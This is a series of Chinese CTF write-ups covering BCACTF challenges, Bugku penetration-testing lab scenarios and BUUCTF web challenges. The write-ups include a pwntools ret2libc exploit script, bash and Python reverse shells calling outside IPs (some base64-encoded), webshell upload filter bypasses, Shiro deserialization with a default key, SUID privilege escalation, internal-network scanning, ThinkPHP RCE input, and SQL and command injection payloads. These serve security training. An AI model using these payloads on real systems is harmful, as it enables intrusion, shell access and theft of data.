<p>目录里面有个admin，点进去发现是登陆后台的界面</p>
<p><img src="https://z4a.net/images/2022/06/04/imaged3f96bb0d8591577.png" alt="imaged3f96bb0d8591577.png"></p>
<p><img src="https://z4a.net/images/2022/06/04/image847c2cf74db009c4.png" alt="image847c2cf74db009c4.png"></p>
<p>看源代码，查看adminLog.js文件发现这段代码</p>
<pre><code class="hljs plaintext">function handleInput() &#123;
    let uname=unameElem.value;
    if (uname != &quot;admin&quot;) &#123;
        alert(&quot;You&#x27;re not admin&quot;);
        return;
    &#125;

    let pwd = pwdElem.value;
    let encodedPwd = fancyEncode(pwd);

    setCookie(&quot;pwd&quot;, encodedPwd, 365);

    window.location.replace(&quot;adminEditor.html&quot;);

&#125;

//dont worry about the intricacies of the setCookie and getCookie functions
//just understand what they do and how to use them</code></pre>
<p>说明用户名需要修改成admin，密码的话貌似随便就行，然后就可正常登陆进去。</p>
<p>但是这个用户名初始是Guest，不能直接改，用f12改一下就可以。</p>
<p>登陆进去之后是空白页面，应该就是cookie问题吧，继续查看源代码，发现两个js文件，看一下editor.js文件，发现下面这段代码</p>
<pre><code class="hljs plaintext">if (getCookie(&quot;pwd&quot;) == &quot;98e99e97e99e116e102e123e117e36e101e114e115e95e115e51e51e95e99e48e48e107e33e101e115e95e55e111e111e95e56e54e51e111e52e116e53e125e&quot;) &#123;
    window.location.replace(&quot;flag.html&quot;);
&#125;</code></pre>
<p>意思就是把pwd这个cookie的值改成这些就会出来flag.html的页面内容，修改刷新得到flag。</p>
<p><img src="https://z4a.net/images/2022/06/04/image1ddf63b9d8870070.png" alt="image1ddf63b9d8870070.png"></p>
<p>bcactf{u$ers_s33_c00k!es_7oo_863o4t5}</p>
<h1 id="misc">Misc</h1>
<h2 id="broken-image">Broken Image</h2>
<blockquote>
<p>My friend said that he made a really cool drawing in MS Paint but I can’t open it! Maybe my computer is broken? Or the image? I really don’t know. Could you try opening it for me and telling me what it is?</p>
</blockquote>
<p>下载个chall.svg,010查看是png格式，改后缀得到flag</p>
<p><img src="https://z4a.net/images/2022/06/04/image3a21f45ebb84c46e.png" alt="image3a21f45ebb84c46e.png"></p>
<p>bcactf{br0k3n_1m4g3_4nd_1m4g3_4nd_1m4g3}</p>
<h2 id="my-new-friend">My New Friend</h2>
<p>附件一个图片，lsb得到flag</p>
<p><img src="https://z4a.net/images/2022/06/04/imagedca1db2c6fa8636e.png" alt="imagedca1db2c6fa8636e.png"></p>
<p>bcactf{h15_n4m3_15_g3rb3rt_4798jU}</p>
<h1 id="pwn">pwn</h1>
<h2 id="intro-2-pwn">Intro 2 Pwn</h2>
<blockquote>
<p>So… you want to learn how to pwn?</p>
</blockquote>
<p>就是玩玩wpn，我不会，这个就是送分的，nc之后是这样<img src="https://z4a.net/images/2022/06/10/imagebee2cf1d4f79d3dd.png" alt="imagebee2cf1d4f79d3dd.png"></p>
<pre><code class="hljs plaintext">bcactf&#123;theysay_aflagisworth100hamsters_8e7389bc&#125;</code></pre>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku渗透(一)</title>
    <url>/2022/09/27/bugku%E6%B8%97%E9%80%8F1/</url>
    <content><![CDATA[<p>bugku渗透(一)</p>
<span id="more"></span>
<p>bugku出了新的模式，渗透测试，来水水文章，一共有十一个场景，也就是相当于十一个题目吧</p>
<hr>
<h1 id="场景一">场景一</h1>
<p>刚开始只给了一个地址http://139.224.3.107:80</p>
<p>访问一下，源码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271005299.png?x-oss-process=hzy" alt="image-20220927100519237"></p>
<p>PS：下个flag网站管理员才能看到哦</p>
<p>flag{f42f76f14f9cce709a39b3bdad69a627}</p>
<h1 id="场景二">场景二</h1>
<p>这个应该就是网站后台吧，dirsearch扫一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271017087.png?x-oss-process=hzy" alt="image-20220927101707032"></p>
<p>得到admin</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271010591.png?x-oss-process=hzy" alt="image-20220927101015521"></p>
<p>浅浅试了一下，admin/admin登录</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271011357.png?x-oss-process=hzy" alt="image-20220927101111300"></p>
<p>ps:/home</p>
<p>flag{f624caaebfc9654f14f33114908a952c}</p>
<h1 id="场景三">场景三</h1>
<p>这个是home路径下的，访问一下看看</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271012228.png?x-oss-process=hzy" alt="image-20220927101238160"></p>
<p>不存在，所以应该是进入home文件夹下，也就是需要getshell，在后台寻找一下利用点</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271014401.png?x-oss-process=hzy" alt="image-20220927101402347"></p>
<p>存在上传配置，加个php</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271015935.png?x-oss-process=hzy" alt="image-20220927101547883"></p>
<p>应该是streplace函数了，php替换为空，尝试大小写绕过成功</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271021147.png?x-oss-process=hzy" alt="image-20220927102133071"></p>
<p>但是这个上传之后发现连不上，不知道咋回事，尝试双写绕过成功连接</p>
<p>上蚁剑</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271025993.png?x-oss-process=hzy" alt="image-20220927102527925"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271027810.png?x-oss-process=hzy" alt="image-20220927102706770"></p>
<p>PS:root and database</p>
<p>flag{f3b1bce4b65eea538acd840cb304c051}</p>
<h1 id="场景四">场景四</h1>
<p>这道应该就是和数据库有关系了，同时涉及到权限</p>
<p>find一下database，寻找config.php的相关配置</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271030880.png?x-oss-process=hzy" alt="image-20220927103049832"></p>
<p>得到root为root/root</p>
<p>nmap扫一下开放端口</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271033183.png?x-oss-process=hzy" alt="image-20220927103330142"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271036735.png?x-oss-process=hzy" alt="image-20220927103613678"></p>
<p>发现3306mysql端口并没有打开，搜了一下可以直接在蚁剑里用mysqldump  dump下来</p>
<pre><code class="hljs plaintext">mysqldump -uroot -proot flag &gt; flag.sql</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271035546.png?x-oss-process=hzy" alt="image-20220927103503488"></p>
<p>ps：可以试试nc 还有 root</p>
<p>flag{6f1fe51fc70b3adc54fd54ae79a1cf0d}</p>
<p>另一个方法就是蚁剑直接连接数据库</p>
<p>这里应该是需要一种插件，给蚁剑安装插件的时候需要开代理</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042135213.png?x-oss-process=hzy" alt="image-20230204213530149"></p>
<h1 id="场景五">场景五</h1>
<p>找了一圈，最后发现这个场景考察的是一个pwn吧</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271041874.png?x-oss-process=hzy" alt="image-20220927104120831"></p>
<p>有个main文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271041807.png?x-oss-process=hzy" alt="image-20220927104135755"></p>
<p>32位文件，ida打开反编译看看</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271042870.png?x-oss-process=hzy" alt="image-20220927104246804"></p>
<p>跟进vul函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271044735.png?x-oss-process=hzy" alt="image-20220927104408685"></p>
<p>这地方存在溢出</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271044454.png?x-oss-process=hzy" alt="image-20220927104458407"></p>
<p>主函数如下</p>
<pre><code class="hljs plaintext">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  size_t v3; // eax
  char s[4]; // [esp+Ah] [ebp-1Eh]

  strcpy(s, &quot;plz input your name:\n&quot;);
  v3 = strlen(s);
  write(1, s, v3);
  vul();
  return 0;
&#125;</code></pre>
<p>没有给/bin/sh，emm，vul函数，在文件中没有找到相关后门函数，是高级ROP类型</p>
<pre><code class="hljs plaintext">ssize_t vul()
&#123;
  char buf; // [esp+4h] [ebp-24h]

  return read(0, &amp;buf, 0x80u);
&#125;
</code></pre>
<p>exp如下</p>
<pre><code class="hljs plaintext">from pwn import *

context.log_level = &quot;debug&quot;

p = remote(&#x27;139.224.3.107&#x27;,9999)
elf = ELF(&#x27;./main&#x27;)

write_plt = elf.plt[&#x27;write&#x27;]
write_got = elf.got[&#x27;write&#x27;]
 
main_addr = 0x0804848A
offset_write =0x0d5c90
offset_system = 0x03adb0
offset_str_bin_sh =0x15bb2b

payload = &#x27;A&#x27; * 40 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)

p.sendlineafter(&#x27;plz input your name:\n&#x27;,payload)
write_addr = u32(p.recv(4))
libc_base = write_addr - offset_write
sys_addr = libc_base + offset_system
sh_addr = libc_base + offset_str_bin_sh

payload = &#x27;A&#x27; * 40 + p32(sys_addr) + p32(4) + p32(sh_addr)
p.sendline(payload)
p.interactive()
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271054310.png?x-oss-process=hzy" alt="image-20220927105421252"></p>
<p>PS：port 8080</p>
<p>flag{4b139fce0c0c3e53a69fc34fabd2d6db}</p>
<h1 id="场景六">场景六</h1>
<p>看8080端口</p>
<p>dirsearch扫一下得到robots.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271057092.png?x-oss-process=hzy" alt="image-20220927105703038"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271057314.png?x-oss-process=hzy" alt="image-20220927105715271"></p>
<p>PS:next to my home</p>
<p>flag{00200c35443afb415c4427f94094fdd0}</p>
<h1 id="场景七">场景七</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271058329.png?x-oss-process=hzy" alt="image-20220927105819267"></p>
<p>抓个包看看</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271059783.png?x-oss-process=hzy" alt="image-20220927105939682"></p>
<p>nice，shiro洞</p>
<p>先用下面这个寻找一下是否存在默认的key</p>
<p><a href="https://github.com/insightglacier/Shiro_exploit">insightglacier/Shiro_exploit: Apache Shiro 反序列化漏洞检测与利用工具 (github.com)</a></p>
<p>找到true key</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271118276.png?x-oss-process=hzy" alt="image-20220927111831216"></p>
<pre><code class="hljs plaintext">vulnerable:True url:http://139.224.3.107:8080   CipherKey:kPH+bIxk5D2deZiIxcaaaA==</code></pre>
<p>制作vps反弹shell</p>
<pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/43.138.40.212/7777 0&gt;&amp;1</code></pre>
<p>Java Runtime 配合 bash 编码</p>
<p><a href="https://www.sqlsec.com/rce/">命令执行在线编码 | 国光 (sqlsec.com)</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271125746.png?x-oss-process=hzy" alt="image-20220927112511685"></p>
<pre><code class="hljs plaintext">echo YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzguNDAuMjEyLzc3NzcgMD4mMQ==|base64 -d|bash -i
bash -c &#123;echo YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzguNDAuMjEyLzc3NzcgMD4mMQ==&#125;|&#123;base64 -d&#125;|&#123;bash -i&#125;</code></pre>
<p>剩下的利用方式参考文章<a href="https://cloud.tencent.com/developer/article/1657019">Shiro反序列化漏洞利用汇总 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p>有亿点点麻烦，时间来不及了，直接在github找自动化</p>
<p><a href="https://github.com/fupinglee/JavaTools">fupinglee/JavaTools: 一些Java编写的小工具。 (github.com)</a></p>
<p>flag{ebc4589713b98ca222f788902adb408f}</p>
<h1 id="场景八">场景八</h1>
<p>suid提权</p>
<pre><code class="hljs plaintext">find / -perm -4000 -type f 2&gt;/dev/null #查看具有suid 权限的可执行二进制程序</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271156885.png?x-oss-process=hzy" alt="image-20220927115642833"></p>
<p>没完成</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271202106.png?x-oss-process=hzy" alt="image-20220927120235045"></p>
<p>下次有金币再玩吧</p>
<h1 id="go-on">GO-ON</h1>
<blockquote>
<p>2023-02-04</p>
<p>又来了又来了</p>
</blockquote>
<p>场景八的提权，sudo不行，因为sudo -l不存在此命令</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042144426.png?x-oss-process=hzy" alt="image-20230204214411375"></p>
<p>继续尝试一下是不是suid提权</p>
<pre><code class="hljs plaintext">find / -type f -perm -u=s 2&gt;/dev/null</code></pre>
<p>先反弹到vps上shell，蚁剑终端不舒服</p>
<pre><code class="hljs plaintext">ncat vps 8806 -e sh</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042148391.png?x-oss-process=hzy" alt="image-20230204214816351"></p>
<blockquote>
<p>弹错shell了，应该是shiro反序列化的那个靶机</p>
</blockquote>
<p>写入内存马</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042211295.png?x-oss-process=hzy" alt="image-20230204221111256"></p>
<p>连不上，我不李姐</p>
<p>这里用python来反弹shell</p>
<pre><code class="hljs plaintext">export RHOST=&quot;43.143.195.203&quot;;export RPORT=8806;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</code></pre>
<p>监听端口，然后执行python -c &quot;import pty;pty.spawn(‘/bin/bash’)&quot;成功反弹shell</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042219082.png?x-oss-process=hzy" alt="image-20230204221920038"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042220842.png?x-oss-process=hzy" alt="image-20230204222001801"></p>
<p>find的suid提权</p>
<pre><code class="hljs plaintext">find hzy -exec ls \;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042221585.png?x-oss-process=hzy" alt="image-20230204222115552"></p>
<p>成功执行，找到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042221365.png?x-oss-process=hzy" alt="image-20230204222151328"></p>
<p>flag{a790c8d551bbe198354f427c9fff6837}</p>
<h1 id="场景九">场景九</h1>
<blockquote>
<p>Internal network</p>
</blockquote>
<p>擦，感觉该进内网了，没ipconfig，有git，猜我怎么想的，直接git远程下载fscan</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042224059.png?x-oss-process=hzy" alt="image-20230204222426001"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042227016.png?x-oss-process=hzy" alt="image-20230204222735954"></p>
<p>这个时候还是需要知道网段才行，用ip address</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042228732.png?x-oss-process=hzy" alt="image-20230204222808686"></p>
<pre><code class="hljs plaintext">ip address
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
9: eth0@if10: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:a8:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.0.3/24 brd 192.168.0.255 scope global eth0
       valid_lft forever preferred_lft forever</code></pre>
<p>探测192.168.0.0/24</p>
<pre><code class="hljs plaintext">192.168.0.1:8080 open
192.168.0.3:8080 open
192.168.0.4:3306 open
192.168.0.1:80 open
192.168.0.4:80 open
192.168.0.2:80 open
192.168.0.1:22 open
192.168.0.1:9999 open
192.168.0.2:9999 open
[*] WebTitle: http://192.168.0.3:8080   code:302 len:0      title:None 跳转url: http://192.168.0.3:8080/login;jsessionid=B87B16A1953B413F38E39A8A8B43A48D
[*] WebTitle: http://192.168.0.1:8080   code:302 len:0      title:None 跳转url: http://192.168.0.1:8080/login;jsessionid=7595E67F313D9459B44EFB2C20D7CD6E
[*] WebTitle: http://192.168.0.3:8080/login;jsessionid=B87B16A1953B413F38E39A8A8B43A48D code:200 len:2608   title:Login Page
[*] WebTitle: http://192.168.0.1:8080/login;jsessionid=7595E67F313D9459B44EFB2C20D7CD6E code:200 len:2608   title:Login Page
[*] WebTitle: http://192.168.0.1        code:200 len:59431  title:W3School教程系统 | 打造专一的web在线教程系统
[*] WebTitle: http://192.168.0.2        code:200 len:59431  title:W3School教程系统 | 打造专一的web在线教程系统
[*] WebTitle: http://192.168.0.4        code:200 len:8351   title:博客首页
[+] http://192.168.0.3:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;]
[+] http://192.168.0.4 poc-yaml-thinkphp5023-method-rce poc1
[+] http://192.168.0.1:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;]</code></pre>
<p>显然内网服务很多，需要进行内网代理，使用Neo-reGeorg进行内网socks代理</p>
<p>下载地址https://github.com/L-codes/Neo-reGeorg，使用教程网上很多</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042251067.png?x-oss-process=hzy" alt="image-20230204225145015"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042254905.png?x-oss-process=hzy" alt="image-20230204225457866"></p>
<p>即可实现浏览器代理内网</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302042255737.png?x-oss-process=hzy" alt="image-20230204225515668"></p>
<p>TP框架</p>
<pre><code class="hljs plaintext">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUSET_METHOD]=id</code></pre>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU刷题记录-第一页【WEB】</title>
    <url>/2022/07/08/buuctf-web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%5B%E7%AC%AC%E4%B8%80%E9%A1%B5%5D/</url>
    <content><![CDATA[<p>BUU-WEB关刷题记录</p>
<span id="more"></span>
<h1 id="极客大挑战-2019easysql">[极客大挑战 2019]EasySQL</h1>
<p><img src="http://img.hzy2003628.top/image-20230708112307846.png" alt="image-20230708112307846"></p>
<p>引号会报错，存在SQL注入，直接万能密码登录</p>
<pre><code class="hljs plaintext">admin&#x27; or 1=1#</code></pre>
<p><img src="http://img.hzy2003628.top/image-20230708113603021.png" alt="image-20230708113603021"></p>
<p>flag{55cc161c-7d6e-4d13-b9c3-84f6c109fccc}</p>
<h1 id="极客大挑战-2019havefun">[极客大挑战 2019]Havefun</h1>
<p>源码泄露，构造传参得到flag</p>
<img src="http://img.hzy2003628.top/image-20230708113739999.png" alt="image-20230708113739999" style="zoom:200%;">
<p><img src="http://img.hzy2003628.top/image-20230708113806429.png" alt="image-20230708113806429"></p>
<p>flag{3f02ad1c-8db0-4b42-9c46-ffe5876ce9eb}</p>
<h1 id="hctf-2018warmup">[HCTF 2018]WarmUp</h1>
<blockquote>
<!--source.php-->访问该路径得到源码
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
    highlight_file(__FILE__);
    class emmm
    &#123;
        public static function checkFile(&amp;$page)
        &#123;
            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
            if (! isset($page) || !is_string($page)) &#123;
                echo &quot;you can&#x27;t see it&quot;;
                return false;
            &#125;

            if (in_array($page, $whitelist)) &#123;
                return true;
            &#125;

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)
            );
            if (in_array($_page, $whitelist)) &#123;
                return true;
            &#125;

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)
            );
            if (in_array($_page, $whitelist)) &#123;
                return true;
            &#125;
            echo &quot;you can&#x27;t see it&quot;;
            return false;
        &#125;
    &#125;

    if (! empty($_REQUEST[&#x27;file&#x27;])
        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])
        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])
    ) &#123;
        include $_REQUEST[&#x27;file&#x27;];
        exit;
    &#125; else &#123;
        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
    &#125;  
?&gt;</code></pre>
<p>文件包含读取hint.php</p>
<p><img src="http://img.hzy2003628.top/image-20230708114107864.png" alt="image-20230708114107864"></p>
<p>然后先代码审计，file传参点三次判断是不是空或者是不是字符串，然后又进checkFile函数进行判断</p>
<blockquote>
<p>mb_substr(str,start,length,encoding):返回从start位置开始的长度为length的字符串</p>
<p>mb_strpos(str,find_str,offset,encoding):返回str中从offset(默认为0)开始第一次出现find_str的位置</p>
<p>urlcode():对其传入的str参数进行str解码</p>
</blockquote>
<p>在第一次$_page取的是从0开始到第一次出现问号之间的字符串，所以我们在参数中传入一个?绕过白名单</p>
<p><img src="http://img.hzy2003628.top/image-20230708115001451.png" alt="image-20230708115001451"></p>
<p>读取ffffllllaaaagggg</p>
<p><img src="http://img.hzy2003628.top/image-20230708115049936.png" alt="image-20230708115049936"></p>
<p>flag{af9b1bcf-2cef-4b10-8942-746ef68e6b29}</p>
<h1 id="actf2020-新生赛include">[ACTF2020 新生赛]Include</h1>
<p>文件包含，直接用伪协议读取</p>
<p><img src="http://img.hzy2003628.top/image-20230708115150351.png" alt="image-20230708115150351"></p>
<p>flag.php文件用base64编码输出</p>
<blockquote>
<pre><code class="hljs ruby"><span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=index.php</code></pre>
</blockquote>
<p>源码内容也看一下</p>
<pre><code class="hljs plaintext">&lt;meta charset=&quot;utf8&quot;&gt;
&lt;?php
error_reporting(0);
$file = $_GET[&quot;file&quot;];
if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;
   exit(&#x27;hacker!&#x27;);
&#125;
if($file)&#123;
   include($file);
&#125;else&#123;
   echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;
&#125;
?&gt;
</code></pre>
<pre><code class="hljs plaintext">&lt;?php
echo &quot;Can you find out the flag?&quot;;
//flag&#123;3a17fdad-fda2-4664-90ee-0c904b1f30e5&#125;</code></pre>
<h1 id="actf2020-新生赛exec">[ACTF2020 新生赛]Exec</h1>
<p>ping导致的RCE,直接管道符或者分号分割</p>
<p><img src="http://img.hzy2003628.top/image-20230708115607387.png" alt="image-20230708115607387"></p>
<p>flag{7a25cfaf-46c7-4035-b77f-02761cb0e2f1}</p>
<h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h1>
<p>同上</p>
<p>不过是过滤空格，绕过方法有很多</p>
<pre><code class="hljs plaintext">$IFS
$&#123;IFS&#125;
$IFS$1 //$1改成$加其他数字貌似都行
&lt; 
&lt;&gt; 
&#123;cat,flag.php&#125;  //用逗号实现了空格功能
%20 
%09</code></pre>
<p><img src="http://img.hzy2003628.top/image-20230708120519500.png" alt="image-20230708120519500"></p>
<pre><code class="hljs plaintext">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
    die(&quot;fxck your symbol!&quot;);
  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
    die(&quot;fxck your space!&quot;);
  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
    die(&quot;fxck your bash!&quot;);
  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
    die(&quot;fxck your flag!&quot;);
  &#125;
  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
  echo &quot;
&quot;;
  print_r($a);
&#125;

?&gt;</code></pre>
<p>过滤了flag字符，没有过滤反引号，所以可以将ls的内容cat出来</p>
<blockquote>
<p>?ip=127.0.0.1||nl$IFS$1<code>ls</code></p>
</blockquote>
<p><img src="http://img.hzy2003628.top/image-20230708120832098.png" alt="image-20230708120832098"></p>
<p>也可以用变量覆盖，但是必须用分号分割，管道符不行，具体原因不知道为啥</p>
<blockquote>
<p>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/image-20230708121212391.png" alt="image-20230708121212391"></p>
<p>flag{d3e9485d-37cb-4408-b798-17e6766835ff}</p>
<h1 id="强网杯-2019随便注">[强网杯 2019]随便注</h1>
<p><img src="http://img.hzy2003628.top/image-20230708121259793.png" alt="image-20230708121259793"></p>
<p>SQL注入，SQLMAP一把梭不出来</p>
<p><img src="http://img.hzy2003628.top/image-20230708121403596.png" alt="image-20230708121403596"></p>
<p>手注方法在这里也都总结一下几个吧，有看到其他师傅写的文章多个解法</p>
<h2 id="法一">法一</h2>
<blockquote>
<p>1’ or 1=1</p>
</blockquote>
<p>报错</p>
<img src="http://img.hzy2003628.top/image-20230708121828823.png" alt="image-20230708121828823" style="zoom:200%;">
<blockquote>
<p>1’ or 1=1#</p>
</blockquote>
<p>这样就不报错了，成功输出了该表的所有数据</p>
<img src="http://img.hzy2003628.top/image-20230708121847095.png" alt="image-20230708121847095" style="zoom:200%;">
<p>先判断一下其他表吧，首先判断一下字段个数</p>
<blockquote>
<p>1’ union select 1,2;#</p>
</blockquote>
<p>存在过滤</p>
<pre><code class="hljs plaintext">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
<p>用堆叠注入绕过关键字select</p>
<blockquote>
<p>1’;show databases;#</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/image-20230708122205517.png" alt="image-20230708122205517"></p>
<blockquote>
<p>1’;show tables;#</p>
</blockquote>
<img src="http://img.hzy2003628.top/image-20230708122322009.png" alt="image-20230708122322009" style="zoom:200%;">
<p>然后就是不用select语句如何查表，两种方法</p>
<p>方式一：<code>1'; show columns from tableName;#</code></p>
<p>方式二：<code>1';desc tableName;#</code></p>
<blockquote>
<p>注意，如果tableName是纯数字，需要用<code>包裹，比如</code>1’;desc <code>1919810931114514</code>;#`</p>
</blockquote>
<blockquote>
<p>1’; show columns from <code>1919810931114514</code>;#</p>
</blockquote>
<img src="http://img.hzy2003628.top/image-20230708122543734.png" alt="image-20230708122543734" style="zoom:200%;">
<p>看到有flag，通过预编译的方法拼接select关键字、</p>
<blockquote>
<p>1’;PREPARE hacker from concat(‘s’,‘elect’, ’ * from <code>1919810931114514</code> ');EXECUTE hacker;#</p>
</blockquote>
<img src="http://img.hzy2003628.top/image-20230708122633071.png" alt="image-20230708122633071" style="zoom:200%;">
<p>flag{91001bd0-9996-4f51-a00d-1a211940fa08}</p>
<h2 id="法二">法二</h2>
<p>其实就是在第一次遇到select的时候就预编译</p>
<p>直接将select * from <code>1919810931114514</code>这句话转成hex</p>
<pre><code class="hljs plaintext">73656c656374202a2066726f6d20603139313938313039333131313435313460</code></pre>
<p>然后预编译替换一下即可</p>
<pre><code class="hljs plaintext">1&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></pre>
<p>也可以先定义一个变量并将sql语句初始化，然后调用</p>
<pre><code class="hljs plaintext">1&#x27;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#</code></pre>
<h1 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h1>
<p>FUZZ一下，过滤了from、<a href="https://so.csdn.net/so/search?q=union&amp;spm=1001.2101.3001.7020">union</a>、extractvalue、PREPARE，sleep函数也过滤了</p>
<p>猜测一下后端代码</p>
<pre><code class="hljs plaintext">select $_POST[&#x27;query&#x27;] || flag from flag</code></pre>
<p>那我们直接query=*,1就拼接可以输出全部字段</p>
<img src="http://img.hzy2003628.top/image-20230708123430157.png" alt="image-20230708123430157" style="zoom:200%;">
<p>为什么要加1呢？</p>
<p><strong>select 1 from flag的意思其实是建立一个临时列，这个列的所有初始值都被设为1</strong></p>
